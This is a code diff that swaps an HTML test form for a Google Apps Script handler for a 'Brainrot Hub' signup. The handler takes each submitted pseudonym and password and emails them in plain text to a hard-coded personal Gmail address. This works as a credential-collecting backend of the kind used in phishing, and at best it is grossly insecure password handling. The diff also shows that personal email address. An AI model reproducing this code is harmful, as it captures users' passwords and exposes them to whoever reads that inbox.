@@ -1,27 +1,26 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8">
-<title>Test FormSubmit</title>
-</head>
-<body>
-  <h2>Test FormSubmit</h2>
+// Code.gs
+function doPost(e) {
+  try {
+    // récupération des champs envoyés (formulaire x-www-form-urlencoded ou multipart)
+    var params = e.parameter || {};
+    var pseudo = params.pseudo || "(vide)";
+    var mdp = params.password || params.mdp || "(vide)";
 
-  <form id="contactForm">
-  <input type="text" name="pseudo" placeholder="Pseudo" required>
-  <input type="email" name="email" placeholder="Email" required>
-  <button type="submit">Envoyer</button>
-</form>
+    // destinataire — change si besoin
+    var to = "megumikun84@gmail.com";
 
-<script>
-document.getElementById('contactForm').addEventListener('submit', function(e){
-  e.preventDefault();
+    var subject = "Nouvelle inscription — Brainrot Hub";
+    var body = "Nouvelle inscription reçue :\n\n" +
+               "Pseudo : " + pseudo + "\n" +
+               "Mot de passe : " + mdp + "\n\n" +
+               "Envoyé le : " + new Date().toString();
 
-  emailjs.sendForm('service_ucdlkrt', 'template_8bfxknd', this)
-    .then(() => alert('Email envoyé ✅'))
-    .catch(err => alert('Erreur : ' + err));
-});
-</script>
-  
-</body>
-</html>
+    // envoi du mail (depuis le compte Google qui déploie le script)
+    MailApp.sendEmail(to, subject, body);
+
+    // réponse simple (s'affichera après soumission)
+    return HtmlService.createHtmlOutput("<p>✅ Merci — e-mail envoyé !</p>");
+  } catch (err) {
+    return HtmlService.createHtmlOutput("<p>❌ Erreur : " + err.toString() + "</p>");
+  }
+}
